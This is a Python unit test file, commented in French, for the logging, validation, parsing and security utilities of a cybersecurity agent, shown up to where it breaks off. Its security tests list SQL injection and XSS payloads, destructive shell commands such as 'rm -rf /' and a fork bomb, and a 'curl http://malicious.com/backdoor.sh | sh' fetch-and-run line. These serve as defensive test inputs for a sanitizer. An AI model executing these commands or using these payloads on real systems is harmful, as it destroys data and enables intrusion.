"""
Tests unitaires pour les modules utilitaires de l'Agent IA de Cybersécurité

Ce module contient tous les tests pour les utilitaires transversaux :
- Logger (configuration et fonctionnement)
- Validators (validation IP, domaines, etc.)
- Parsers (JSON, XML, données de scan)
- Security (utilitaires de sécurité)

Structure des tests :
- TestLogger : Tests du système de logging
- TestValidators : Tests des validateurs
- TestParsers : Tests des parseurs
- TestSecurity : Tests des utilitaires de sécurité
- TestIntegration : Tests d'intégration des utilitaires
"""

import asyncio
import json
import logging
import os
import tempfile
import unittest
from datetime import datetime
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import pytest

# Import des modules à tester
from src.utils.logger import setup_logger, get_logger_config, configure_file_handler
from src.utils.validators import (
    validate_ip_address, validate_domain, validate_port,
    validate_scan_parameters, validate_vulnerability_data,
    ValidationError as ValidatorError
)
from src.utils.parsers import (
    parse_nmap_xml, parse_json_report, parse_vulnerability_data,
    NmapXMLParser, JSONReportParser, ParserError
)
from src.utils.security import (
    sanitize_input, validate_script_safety, hash_data,
    encrypt_sensitive_data, decrypt_sensitive_data,
    SecurityError
)


class TestLogger(unittest.TestCase):
    """Tests pour le système de logging"""

    def setUp(self):
        """Configuration des tests"""
        self.test_log_dir = tempfile.mkdtemp()
        self.test_log_file = os.path.join(self.test_log_dir, "test.log")

    def tearDown(self):
        """Nettoyage après tests"""
        import shutil
        shutil.rmtree(self.test_log_dir, ignore_errors=True)

    def test_setup_logger_basic(self):
        """Test de configuration basique du logger"""
        logger = setup_logger("test_logger")

        self.assertIsNotNone(logger)
        self.assertEqual(logger.name, "test_logger")
        self.assertGreaterEqual(logger.level, logging.INFO)

    def test_setup_logger_with_file(self):
        """Test de configuration du logger avec fichier"""
        logger = setup_logger(
            "test_file_logger",
            log_file=self.test_log_file,
            log_level="DEBUG"
        )

        # Tester l'écriture dans le fichier
        logger.debug("Test debug message")
        logger.info("Test info message")
        logger.warning("Test warning message")
        logger.error("Test error message")

        # Vérifier que le fichier existe et contient les logs
        self.assertTrue(os.path.exists(self.test_log_file))

        with open(self.test_log_file, 'r') as f:
            content = f.read()
            self.assertIn("Test debug message", content)
            self.assertIn("Test info message", content)
            self.assertIn("Test warning message", content)
            self.assertIn("Test error message", content)

    def test_logger_levels(self):
        """Test des différents niveaux de logging"""
        test_levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]

        for level in test_levels:
            logger = setup_logger(f"test_level_{level}", log_level=level)
            expected_level = getattr(logging, level)
            self.assertEqual(logger.level, expected_level)

    def test_logger_formatting(self):
        """Test du formatage des messages de log"""
        logger = setup_logger(
            "test_format",
            log_file=self.test_log_file,
            log_level="DEBUG"
        )

        test_message = "Test formatting message with data"
        logger.info(test_message, extra={"test_field": "test_value"})

        with open(self.test_log_file, 'r') as f:
            content = f.read()
            self.assertIn(test_message, content)
            # Vérifier la présence de timestamp et niveau
            self.assertRegex(content, r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')
            self.assertIn("INFO", content)

    def test_get_logger_config(self):
        """Test de récupération de la configuration logger"""
        config = get_logger_config()

        self.assertIsInstance(config, dict)
        self.assertIn("level", config)
        self.assertIn("format", config)
        self.assertIn("handlers", config)

    def test_configure_file_handler(self):
        """Test de configuration du handler fichier"""
        logger = logging.getLogger("test_file_handler")

        configure_file_handler(
            logger,
            self.test_log_file,
            max_bytes=1024,
            backup_count=3
        )

        # Tester l'écriture
        logger.info("Test file handler message")

        self.assertTrue(os.path.exists(self.test_log_file))

    @patch('src.utils.logger.RotatingFileHandler')
    def test_rotating_file_handler(self, mock_handler):
        """Test du rotating file handler"""
        mock_instance = Mock()
        mock_handler.return_value = mock_instance

        logger = setup_logger(
            "test_rotating",
            log_file=self.test_log_file,
            max_file_size=1024 * 1024,
            backup_count=5
        )

        # Vérifier que le handler rotatif a été configuré
        mock_handler.assert_called_once()


class TestValidators(unittest.TestCase):
    """Tests pour les validateurs"""

    def test_validate_ip_address_valid(self):
        """Test de validation d'adresses IP valides"""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "127.0.0.1",
            "255.255.255.255",
            "0.0.0.0"
        ]

        for ip in valid_ips:
            with self.subTest(ip=ip):
                self.assertTrue(validate_ip_address(ip))

    def test_validate_ip_address_invalid(self):
        """Test de validation d'adresses IP invalides"""
        invalid_ips = [
            "256.1.1.1",
            "192.168.1",
            "192.168.1.1.1",
            "not.an.ip.address",
            "",
            "192.168.1.-1",
            "192.168..1",
            "192.168.1.a"
        ]

        for ip in invalid_ips:
            with self.subTest(ip=ip):
                self.assertFalse(validate_ip_address(ip))

    def test_validate_ip_address_types(self):
        """Test de validation avec différents types d'entrée"""
        # Test avec None
        self.assertFalse(validate_ip_address(None))

        # Test avec int
        with self.assertRaises(ValidatorError):
            validate_ip_address(192168001)

        # Test avec liste
        with self.assertRaises(ValidatorError):
            validate_ip_address(["192", "168", "1", "1"])

    def test_validate_domain_valid(self):
        """Test de validation de domaines valides"""
        valid_domains = [
            "example.com",
            "sub.example.com",
            "test-domain.org",
            "very.long.subdomain.example.net",
            "localhost",
            "example.museum",
            "xn--domain.com"  # IDN
        ]

        for domain in valid_domains:
            with self.subTest(domain=domain):
                self.assertTrue(validate_domain(domain))

    def test_validate_domain_invalid(self):
        """Test de validation de domaines invalides"""
        invalid_domains = [
            "",
            ".",
            ".com",
            "domain.",
            "domain..com",
            "domain .com",
            "domain.c",
            "very-very-very-very-very-very-very-very-long-domain-name-that-exceeds-limits.com",
            "192.168.1.1",  # IP au lieu de domaine
            "domain with spaces.com"
        ]

        for domain in invalid_domains:
            with self.subTest(domain=domain):
                self.assertFalse(validate_domain(domain))

    def test_validate_port_valid(self):
        """Test de validation de ports valides"""
        valid_ports = [1, 22, 80, 443, 8080, 65535]

        for port in valid_ports:
            with self.subTest(port=port):
                self.assertTrue(validate_port(port))

        # Test avec string
        self.assertTrue(validate_port("443"))

    def test_validate_port_invalid(self):
        """Test de validation de ports invalides"""
        invalid_ports = [0, -1, 65536, 100000, "abc", "", None]

        for port in invalid_ports:
            with self.subTest(port=port):
                self.assertFalse(validate_port(port))

    def test_validate_scan_parameters(self):
        """Test de validation des paramètres de scan"""
        valid_params = {
            "target": "192.168.1.1",
            "scan_type": "full",
            "timeout": 300,
            "ports": "22,80,443"
        }

        # Test paramètres valides
        self.assertTrue(validate_scan_parameters(valid_params))

        # Test paramètres manquants
        invalid_params = {"scan_type": "full"}
        with self.assertRaises(ValidatorError):
            validate_scan_parameters(invalid_params)

        # Test paramètres invalides
        invalid_params = {
            "target": "invalid.ip.address",
            "scan_type": "full"
        }
        with self.assertRaises(ValidatorError):
            validate_scan_parameters(invalid_params)

    def test_validate_vulnerability_data(self):
        """Test de validation des données de vulnérabilité"""
        valid_vuln = {
            "vulnerability_id": "CVE-2024-12345",
            "name": "Test Vulnerability",
            "severity": "HIGH",
            "cvss_score": 7.5,
            "description": "Test vulnerability description"
        }

        # Test données valides
        self.assertTrue(validate_vulnerability_data(valid_vuln))

        # Test données manquantes
        invalid_vuln = {"name": "Test"}
        with self.assertRaises(ValidatorError):
            validate_vulnerability_data(invalid_vuln)

        # Test CVSS score invalide
        invalid_vuln = {
            **valid_vuln,
            "cvss_score": 15.0  # > 10
        }
        with self.assertRaises(ValidatorError):
            validate_vulnerability_data(invalid_vuln)

    def test_validator_error_handling(self):
        """Test de gestion d'erreurs des validateurs"""
        with self.assertRaises(ValidatorError) as context:
            validate_scan_parameters({})

        self.assertIn("target", str(context.exception))


class TestParsers(unittest.TestCase):
    """Tests pour les parseurs"""

    def setUp(self):
        """Configuration des tests"""
        self.test_dir = tempfile.mkdtemp()

        # Créer des fichiers de test
        self.nmap_xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -sV 192.168.1.1" start="1640995200" startstr="Sat Dec 31 12:00:00 2023" version="7.94" xmloutputversion="1.05">
  <host starttime="1640995200" endtime="1640995260">
    <status state="up" reason="echo-reply" reason_ttl="64"/>
    <address addr="192.168.1.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open" reason="syn-ack" reason_ttl="64"/>
        <service name="ssh" product="OpenSSH" version="8.0" method="probed" conf="10"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="open" reason="syn-ack" reason_ttl="64"/>
        <service name="http" product="Apache httpd" version="2.4.6" method="probed" conf="10"/>
        <script id="http-vuln-cve2017-5638" output="
          VULNERABLE:
          Apache Struts2 Remote Code Execution
            State: VULNERABLE
            Description: Apache Struts 2.3.5 - 2.3.31 / 2.5 - 2.5.10 suffers from a remote code execution vulnerability
        "/>
      </port>
    </ports>
  </host>
</nmaprun>"""

        self.nmap_xml_file = os.path.join(self.test_dir, "test_scan.xml")
        with open(self.nmap_xml_file, 'w') as f:
            f.write(self.nmap_xml_content)

        # JSON de test
        self.json_report_content = {
            "scan_info": {
                "target": "192.168.1.1",
                "scan_type": "full",
                "timestamp": "2023-12-31T12:00:00Z"
            },
            "vulnerabilities": [
                {
                    "id": "VULN-001",
                    "name": "Test Vulnerability",
                    "severity": "HIGH",
                    "port": 80,
                    "service": "http"
                }
            ],
            "services": [
                {"port": 22, "service": "ssh", "version": "OpenSSH 8.0"},
                {"port": 80, "service": "http", "version": "Apache 2.4.6"}
            ]
        }

        self.json_file = os.path.join(self.test_dir, "test_report.json")
        with open(self.json_file, 'w') as f:
            json.dump(self.json_report_content, f)

    def tearDown(self):
        """Nettoyage après tests"""
        import shutil
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_parse_nmap_xml_valid(self):
        """Test de parsing XML Nmap valide"""
        result = parse_nmap_xml(self.nmap_xml_file)

        self.assertIsNotNone(result)
        self.assertIn("host_info", result)
        self.assertIn("ports", result)
        self.assertIn("vulnerabilities", result)

        # Vérifier les ports
        ports = result["ports"]
        self.assertEqual(len(ports), 2)
        self.assertEqual(ports[0]["port"], 22)
        self.assertEqual(ports[1]["port"], 80)

        # Vérifier les vulnérabilités détectées
        vulnerabilities = result["vulnerabilities"]
        self.assertGreater(len(vulnerabilities), 0)

    def test_nmap_xml_parser_class(self):
        """Test de la classe NmapXMLParser"""
        parser = NmapXMLParser()

        result = parser.parse_file(self.nmap_xml_file)

        self.assertIsNotNone(result)
        self.assertEqual(result["target"], "192.168.1.1")

        # Test des services
        services = parser.extract_services(result)
        self.assertGreater(len(services), 0)

        # Test des vulnérabilités
        vulnerabilities = parser.extract_vulnerabilities(result)
        self.assertIsInstance(vulnerabilities, list)

    def test_parse_nmap_xml_invalid(self):
        """Test de parsing XML Nmap invalide"""
        invalid_xml_file = os.path.join(self.test_dir, "invalid.xml")
        with open(invalid_xml_file, 'w') as f:
            f.write("<?xml version='1.0'?><invalid>malformed xml")

        with self.assertRaises(ParserError):
            parse_nmap_xml(invalid_xml_file)

    def test_parse_nmap_xml_file_not_found(self):
        """Test de parsing avec fichier inexistant"""
        with self.assertRaises(ParserError):
            parse_nmap_xml("/nonexistent/file.xml")

    def test_parse_json_report_valid(self):
        """Test de parsing JSON report valide"""
        result = parse_json_report(self.json_file)

        self.assertIsNotNone(result)
        self.assertIn("scan_info", result)
        self.assertIn("vulnerabilities", result)
        self.assertIn("services", result)

        # Vérifier les vulnérabilités
        vulnerabilities = result["vulnerabilities"]
        self.assertEqual(len(vulnerabilities), 1)
        self.assertEqual(vulnerabilities[0]["name"], "Test Vulnerability")

    def test_json_report_parser_class(self):
        """Test de la classe JSONReportParser"""
        parser = JSONReportParser()

        result = parser.parse_file(self.json_file)
        self.assertIsNotNone(result)

        # Test de validation du schéma
        is_valid = parser.validate_schema(result)
        self.assertTrue(is_valid)

        # Test de normalisation
        normalized = parser.normalize_data(result)
        self.assertIn("target", normalized)
        self.assertIn("vulnerabilities", normalized)

    def test_parse_json_report_invalid(self):
        """Test de parsing JSON invalide"""
        invalid_json_file = os.path.join(self.test_dir, "invalid.json")
        with open(invalid_json_file, 'w') as f:
            f.write("{ invalid json content")

        with self.assertRaises(ParserError):
            parse_json_report(invalid_json_file)

    def test_parse_vulnerability_data(self):
        """Test de parsing de données de vulnérabilité"""
        vuln_data = {
            "cve": "CVE-2024-12345",
            "name": "Test Vulnerability",
            "severity": "HIGH",
            "score": 7.5,
            "description": "Test description",
            "affected_systems": ["Apache 2.4.6"],
            "references": [
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12345"
            ]
        }

        result = parse_vulnerability_data(vuln_data)

        self.assertIsNotNone(result)
        self.assertEqual(result["vulnerability_id"], "CVE-2024-12345")
        self.assertEqual(result["severity"], "HIGH")
        self.assertEqual(result["cvss_score"], 7.5)

    def test_parser_error_handling(self):
        """Test de gestion d'erreurs des parseurs"""
        # Test avec données None
        with self.assertRaises(ParserError):
            parse_vulnerability_data(None)

        # Test avec données manquantes
        incomplete_data = {"name": "Test"}
        with self.assertRaises(ParserError):
            parse_vulnerability_data(incomplete_data)

    def test_parser_performance(self):
        """Test de performance des parseurs"""
        import time

        # Test performance parsing XML
        start_time = time.time()
        for _ in range(10):
            parse_nmap_xml(self.nmap_xml_file)
        xml_duration = time.time() - start_time

        # Test performance parsing JSON
        start_time = time.time()
        for _ in range(10):
            parse_json_report(self.json_file)
        json_duration = time.time() - start_time

        # JSON devrait être plus rapide que XML
        self.assertLess(json_duration, xml_duration)


class TestSecurity(unittest.TestCase):
    """Tests pour les utilitaires de sécurité"""

    def test_sanitize_input_basic(self):
        """Test de sanitisation basique des entrées"""
        # Test avec entrée normale
        clean_input = sanitize_input("normal_input_123")
        self.assertEqual(clean_input, "normal_input_123")

        # Test avec caractères dangereux
        dangerous_input = "input'; DROP TABLE users; --"
        clean_input = sanitize_input(dangerous_input)
        self.assertNotIn("DROP", clean_input)
        self.assertNotIn(";", clean_input)

    def test_sanitize_input_sql_injection(self):
        """Test de protection contre injection SQL"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords --"
        ]

        for attempt in sql_injection_attempts:
            with self.subTest(attempt=attempt):
                sanitized = sanitize_input(attempt)
                self.assertNotIn("DROP", sanitized.upper())
                self.assertNotIn("UNION", sanitized.upper())
                self.assertNotIn("--", sanitized)

    def test_sanitize_input_xss(self):
        """Test de protection contre XSS"""
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]

        for attempt in xss_attempts:
            with self.subTest(attempt=attempt):
                sanitized = sanitize_input(attempt)
                self.assertNotIn("<script>", sanitized.lower())
                self.assertNotIn("javascript:", sanitized.lower())
                self.assertNotIn("onerror", sanitized.lower())

    def test_validate_script_safety_safe(self):
        """Test de validation de scripts sécurisés"""
        safe_scripts = [
            "echo 'Hello World'",
            "ls -la /tmp",
            "grep 'pattern' file.txt",
            "systemctl status apache2"
        ]

        for script in safe_scripts:
            with self.subTest(script=script):
                result = validate_script_safety(script)
                self.assertTrue(result["is_safe"])

    def test_validate_script_safety_dangerous(self):
        """Test de validation de scripts dangereux"""
        dangerous_scripts = [
            "rm -rf /",
            ":(){ :|:& };:",  # fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "curl http://malicious.com/backdoor.sh | sh"
        ]

        for script in dangerous_scripts:
            with self.subTest(script=script):
                result = validate_script_safety(script)
                self.assertFalse(result["is_safe"])
                self.assertGreater(len(result["risks"]), 0)

    def test_hash_data(self):
        """Test de hashage des données"""
        test_data = "test_data_to_hash"

        # Test SHA256 (défaut)
        hash1 = hash_data(test_data)
        hash2 = hash_data(test_data)
        self.assertEqual(hash1, hash2)  # Même data = même hash
        self.assertEqual(len(hash1), 64)  # SHA256 = 64 chars hex

        # Test avec différents algorithmes
        hash_md5 = hash_data(test_data, algorithm="md5")
        self.assertEqual(len(hash_md5), 32)  # MD5 = 32 chars hex

        hash_sha1 = hash_data(test_data, algorithm="sha1")
        self.assertEqual(len(hash_sha1), 40)  # SHA1 = 40 chars hex

        # Tous les hashes doivent être différents
        self.assertNotEqual(hash1, hash_md5)
        self.assertNotEqual(hash1, hash_sha1)
        self.assertNotEqual(hash_md5, hash_sha1)

    def test_hash_data_with_salt(self):
        """Test de hashage avec sel"""
        test_data = "test_data"
        salt = "random_salt"

        hash_with_salt = hash_data(test_data, salt=salt)
        hash_without_salt = hash_data(test_data)

        self.assertNotEqual(hash_with_salt, hash_without_salt)

        # Même data + même sel = même hash
        hash_same_salt = hash_data(test_data, salt=salt)
        self.assertEqual(hash_with_salt, hash_same_salt)

    def test_encrypt_decrypt_data(self):
        """Test de chiffrement/déchiffrement"""
        test_data = "sensitive_data_to_encrypt"
        password = "secure_password_123"

        # Chiffrement
        encrypted = encrypt_sensitive_data(test_data, password)
        self.assertNotEqual(encrypted, test_data)
        self.assertIsInstance(encrypted, str)

        # Déchiffrement
        decrypted = decrypt_sensitive_data(encrypted, password)
        self.assertEqual(decrypted, test_data)

    def test_encrypt_decrypt_wrong_password(self):
        """Test de déchiffrement avec mauvais mot de passe"""
        test_data = "sensitive_data"
        correct_password = "correct_password"
        wrong_password = "wrong_password"

        encrypted = encrypt_sensitive_data(test_data, correct_password)

        with self.assertRaises(SecurityError):
            decrypt_sensitive_data(encrypted, wrong_password)

    def test_encrypt_decrypt_empty_data(self):
        """Test de chiffrement de données vides"""
        password = "password"

        # Test avec chaîne vide
        encrypted_empty = encrypt_sensitive_data("", password)
        decrypted_empty = decrypt_sensitive_data(encrypted_empty, password)
        self.assertEqual(decrypted_empty, "")

        # Test avec None (devrait lever une exception)
        with self.assertRaises(SecurityError):
            encrypt_sensitive_data(None, password)

    def test_security_error_handling(self):
        """Test de gestion d'erreurs de sécurité"""
        with self.assertRaises(SecurityError) as context:
            validate_script_safety("")

        self.assertIn("script", str(context.exception).lower())


class TestIntegration(unittest.TestCase):
    """Tests d'intégration des utilitaires"""

    def setUp(self):
        """Configuration des tests d'intégration"""
        self.test_dir = tempfile.mkdtemp()
        self.logger = setup_logger("test_integration", log_level="DEBUG")

    def tearDown(self):
        """Nettoyage après tests"""
        import shutil
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_full_workflow_validation_and_parsing(self):
        """Test d'un workflow complet validation + parsing"""
        # 1. Valider les paramètres d'entrée
        scan_params = {
            "target": "192.168.1.100",
            "scan_type": "full",
            "timeout": 300,
            "ports": "22,80,443"
        }

        self.assertTrue(validate_scan_parameters(scan_params))

        # 2. Créer des données de scan simulées
        scan_data = {
            "scan_info": {
                "target": scan_params["target"],
                "scan_type": scan_params["scan_type"],
                "timestamp": datetime.utcnow().isoformat()
            },
            "vulnerabilities": [
                {
                    "id": "CVE-2024-12345",
                    "name": "Test Vulnerability",
                    "severity": "HIGH",
                    "cvss_score": 8.5,
                    "port": 80,
                    "service": "http",
                    "description": "Test vulnerability description"
                }
            ],
            "services": [
                {"port": 22, "service": "ssh", "version": "OpenSSH 8.0"},
                {"port": 80, "service": "http", "version": "Apache 2.4.6"},
                {"port": 443, "service": "https", "version": "Apache 2.4.6"}
            ]
        }

        # 3. Sauvegarder et parser les données
        json_file = os.path.join(self.test_dir, "integration_test.json")
        with open(json_file, 'w') as f:
            json.dump(scan_data, f)

        parsed_data = parse_json_report(json_file)

        # 4. Valider les données parsées
        for vuln in parsed_data["vulnerabilities"]:
            normalized_vuln = parse_vulnerability_data(vuln)
            self.assertTrue(validate_vulnerability_data(normalized_vuln))

        # 5. Logger les résultats
        self.logger.info(f"Parsed {len(parsed_data['vulnerabilities'])} vulnerabilities")
        self.logger.info(f"Found {len(parsed_data['services'])} services")

    def test_security_validation_workflow(self):
        """Test du workflow de validation de sécurité"""
        # 1. Valider l'entrée utilisateur
        user_input = "192.168.1.1; echo 'test'"
        sanitized_input = sanitize_input(user_input)

        # 2. Valider que l'input est sécurisé
        self.assertNotIn(";", sanitized_input)

        # 3. Créer un script de test
        test_script = f"""#!/bin/bash
echo "Scanning {sanitized_input}"
nmap -sV {sanitized_input}
"""

        # 4. Valider la sécurité du script
        safety_result = validate_script_safety(test_script)
        self.assertTrue(safety_result["is_safe"])

        # 5. Hasher le script pour intégrité
        script_hash = hash_data(test_script)
        self.assertEqual(len(script_hash), 64)

        # 6. Logger les opérations de sécurité
        self.logger.info(f"User input sanitized: {len(sanitized_input)} chars")
        self.logger.info(f"Script validated: {safety_result['is_safe']}")
        self.logger.info(f"Script hash: {script_hash[:16]}...")

    def test_error_handling_integration(self):
        """Test de gestion d'erreurs intégrée"""
        # Test avec données corrompues
        corrupted_json = os.path.join(self.test_dir, "corrupted.json")
        with open(corrupted_json, 'w') as f:
            f.write("{ corrupted json data")

        with self.assertRaises(ParserError):
            parse_json_report(corrupted_json)

        # Test avec validation échouée
        invalid_params = {"target": "invalid_ip"}
        with self.assertRaises(ValidatorError):
            validate_scan_parameters(invalid_params)

        # Test avec script dangereux
        dangerous_script = "rm -rf /"
        safety_result = validate_script_safety(dangerous_script)
        self.assertFalse(safety_result["is_safe"])

    def test_performance_integration(self):
        """Test de performance intégrée"""
        import time

        # Créer un gros dataset de test
        large_dataset = {
            "vulnerabilities": []
        }

        for i in range(1000):
            large_dataset["vulnerabilities"].append({
                "id": f"CVE-2024-{i:05d}",
                "name": f"Test Vulnerability {i}",
                "severity": "MEDIUM",
                "cvss_score": 5.0 + (i % 5),
                "description": f"Test vulnerability description {i}"
            })

        # Test performance de validation
        start_time = time.time()
        for vuln in large_dataset["vulnerabilities"]:
            try:
                validate_vulnerability_data(vuln)
            except ValidatorError:
                pass
        validation_time = time.time() - start_time

        # Test performance de hashage
        start_time = time.time()
        for vuln in large_dataset["vulnerabilities"]:
            hash_data(json.dumps(vuln))
        hashing_time = time.time() - start_time

        self.logger.info(f"Validated 1000 vulnerabilities in {validation_time:.3f}s")
        self.logger.info(f"Hashed 1000 items in {hashing_time:.3f}s")

        # Les opérations doivent être raisonnablement rapides
        self.assertLess(validation_time, 5.0)  # < 5 secondes
        self.assertLess(hashing_time, 2.0)     # < 2 secondes


class TestUtilsEdgeCases(unittest.TestCase):
    """Tests des cas limites et edge cases"""

    def test_validator_edge_cases(self):
        """Test des cas limites pour les validateurs"""
        # IP avec zéros non significatifs
        self.assertTrue(validate_ip_address("192.168.001.001"))

        # Domaine avec tirets
        self.assertTrue(validate_domain("test-domain.co.uk"))

        # Port limite
        self.assertTrue(validate_port(1))
        self.assertTrue(validate_port(65535))
        self.assertFalse(validate_port(0))
        self.assertFalse(validate_port(65536))

    def test_parser_edge_cases(self):
        """Test des cas limites pour les parseurs"""
        # XML avec namespaces
        xml_with_ns = """<?xml version="1.0"?>
        <nmaprun xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <host>
                <status state="up"/>
                <address addr="127.0.0.1" addrtype="ipv4"/>
                <ports>
                    <port protocol="tcp" portid="22">
                        <state state="open"/>
                        <service name="ssh"/>
                    </port>
                </ports>
            </host>
        </nmaprun>"""

        test_file = tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False)
        test_file.write(xml_with_ns)
        test_file.close()

        try:
            result = parse_nmap_xml(test_file.name)
            self.assertIsNotNone(result)
        finally:
            os.unlink(test_file.name)

        # JSON avec champs optionnels manquants
        minimal_json = {
            "scan_info": {"target": "127.0.0.1"},
            "vulnerabilities": [],
            "services": []
        }

        test_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
        json.dump(minimal_json, test_file)
        test_file.close()

        try:
            result = parse_json_report(test_file.name)
            self.assertIsNotNone(result)
        finally:
            os.unlink(test_file.name)

    def test_security_edge_cases(self):
        """Test des cas limites pour la sécurité"""
        # Input avec caractères Unicode
        unicode_input = "test_données_accentuées_αβγ"
        sanitized = sanitize_input(unicode_input)
        self.assertIsNotNone(sanitized)

        # Script avec commentaires
        script_with_comments = """#!/bin/bash
        # This is a comment
        echo "Hello World"  # End comment
        """
        result = validate_script_safety(script_with_comments)
        self.assertTrue(result["is_safe"])

        # Chiffrement avec caractères spéciaux
        special_data = "données with spécial chars: àéùç@#$%"
        password = "môt_de_passe_spécial_123!"

        encrypted = encrypt_sensitive_data(special_data, password)
        decrypted = decrypt_sensitive_data(encrypted, password)
        self.assertEqual(decrypted, special_data)

    def test_logger_edge_cases(self):
        """Test des cas limites pour le logger"""
        # Logger avec nom très long
        long_name = "very_" * 50 + "long_logger_name"
        logger = setup_logger(long_name)
        self.assertIsNotNone(logger)

        # Logger avec caractères spéciaux dans le message
        logger.info("Message avec caractères spéciaux: àéùç@#$%^&*()")

        # Logger avec objets complexes
        complex_object = {
            "nested": {
                "data": [1, 2, 3],
                "timestamp": datetime.utcnow(),
                "special_chars": "àéùç"
            }
        }
        logger.info(f"Complex object: {complex_object}")


class TestUtilsAsync(unittest.TestCase):
    """Tests des fonctionnalités asynchrones des utilitaires"""

    def setUp(self):
        """Configuration des tests async"""
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    def tearDown(self):
        """Nettoyage après tests async"""
        self.loop.close()

    async def async_validation_test(self):
        """Test de validation asynchrone"""
        # Simulation de validation asynchrone
        await asyncio.sleep(0.01)  # Simule une opération async

        test_ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
        results = []

        for ip in test_ips:
            await asyncio.sleep(0.001)  # Simule latence
            results.append(validate_ip_address(ip))

        return all(results)

    def test_async_validation(self):
        """Test de validation en mode asynchrone"""
        result = self.loop.run_until_complete(self.async_validation_test())
        self.assertTrue(result)

    async def async_parsing_test(self):
        """Test de parsing asynchrone"""
        # Créer des données de test
        test_data = []
        for i in range(10):
            test_data.append({
                "id": f"CVE-2024-{i:04d}",
                "name": f"Vulnerability {i}",
                "severity": "MEDIUM",
                "cvss_score": 5.0
            })

        # Parser de manière asynchrone
        results = []
        for data in test_data:
            await asyncio.sleep(0.001)
            try:
                parsed = parse_vulnerability_data(data)
                results.append(parsed)
            except ParserError:
                pass

        return len(results)

    def test_async_parsing(self):
        """Test de parsing en mode asynchrone"""
        result = self.loop.run_until_complete(self.async_parsing_test())
        self.assertEqual(result, 10)


class TestUtilsMocking(unittest.TestCase):
    """Tests avec mocking pour simuler différents comportements"""

    @patch('src.utils.validators.socket.inet_aton')
    def test_ip_validation_with_mock(self, mock_inet):
        """Test de validation IP avec mock"""
        # Simuler une exception pour IP invalide
        mock_inet.side_effect = OSError("Invalid IP")

        result = validate_ip_address("invalid.ip")
        self.assertFalse(result)

        # Simuler succès
        mock_inet.side_effect = None
        mock_inet.return_value = b'\xc0\xa8\x01\x01'

        result = validate_ip_address("192.168.1.1")
        self.assertTrue(result)

    @patch('builtins.open')
    def test_parser_file_error_mock(self, mock_open):
        """Test d'erreur de fichier avec mock"""
        # Simuler erreur d'ouverture de fichier
        mock_open.side_effect = IOError("File not found")

        with self.assertRaises(ParserError):
            parse_json_report("nonexistent_file.json")

    @patch('src.utils.security.os.urandom')
    def test_encryption_with_mock(self, mock_urandom):
        """Test de chiffrement avec mock"""
        # Simuler génération de sel prévisible
        mock_urandom.return_value = b'fixed_salt_16bytes'

        data = "test data"
        password = "test password"

        encrypted1 = encrypt_sensitive_data(data, password)
        encrypted2 = encrypt_sensitive_data(data, password)

        # Avec le même sel, le chiffrement devrait être identique
        self.assertEqual(encrypted1, encrypted2)


# === UTILITAIRES DE TEST ===

class TestUtilsHelpers:
    """Classe d'helpers pour les tests"""

    @staticmethod
    def create_test_vulnerability(vuln_id: str = "TEST-001") -> dict:
        """Crée une vulnérabilité de test"""
        return {
            "vulnerability_id": vuln_id,
            "name": f"Test Vulnerability {vuln_id}",
            "severity": "MEDIUM",
            "cvss_score": 5.0,
            "description": f"Test vulnerability description for {vuln_id}",
            "affected_service": "test_service",
            "affected_port": 80,
            "cve_ids": [f"CVE-2024-{vuln_id[-3:]}"],
            "references": ["https://example.com/vuln"],
            "detection_method": "test_method",
            "confidence": "HIGH"
        }

    @staticmethod
    def create_test_scan_params(target: str = "192.168.1.1") -> dict:
        """Crée des paramètres de scan de test"""
        return {
            "target": target,
            "scan_type": "full",
            "timeout": 300,
            "ports": "22,80,443,8080",
            "nmap_args": "-sV -sC --script vuln"
        }

    @staticmethod
    def create_large_dataset(size: int = 100) -> list:
        """Crée un dataset de test volumineux"""
        dataset = []
        for i in range(size):
            dataset.append(TestUtilsHelpers.create_test_vulnerability(f"BULK-{i:04d}"))
        return dataset


# === BENCHMARKS ET PERFORMANCE ===

class TestUtilsBenchmarks(unittest.TestCase):
    """Tests de performance et benchmarks"""

    def setUp(self):
        """Configuration des benchmarks"""
        self.large_dataset = TestUtilsHelpers.create_large_dataset(1000)

    def benchmark_validators(self):
        """Benchmark des validateurs"""
        import time

        # Benchmark validation IP
        ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1", "8.8.8.8"] * 250

        start_time = time.perf_counter()
        for ip in ips:
            validate_ip_address(ip)
        ip_validation_time = time.perf_counter() - start_time

        # Benchmark validation vulnérabilités
        start_time = time.perf_counter()
        for vuln in self.large_dataset:
            try:
                validate_vulnerability_data(vuln)
            except ValidatorError:
                pass
        vuln_validation_time = time.perf_counter() - start_time

        print(f"\nBenchmarks Validation:")
        print(f"IP validation (1000 items): {ip_validation_time:.4f}s")
        print(f"Vulnerability validation (1000 items): {vuln_validation_time:.4f}s")

        return {
            "ip_validation": ip_validation_time,
            "vuln_validation": vuln_validation_time
        }

    def benchmark_parsers(self):
        """Benchmark des parseurs"""
        import time
        import tempfile
        import json

        # Créer un fichier JSON volumineux
        large_json_data = {
            "scan_info": {"target": "192.168.1.1"},
            "vulnerabilities": self.large_dataset,
            "services": [
                {"port": 22, "service": "ssh"},
                {"port": 80, "service": "http"},
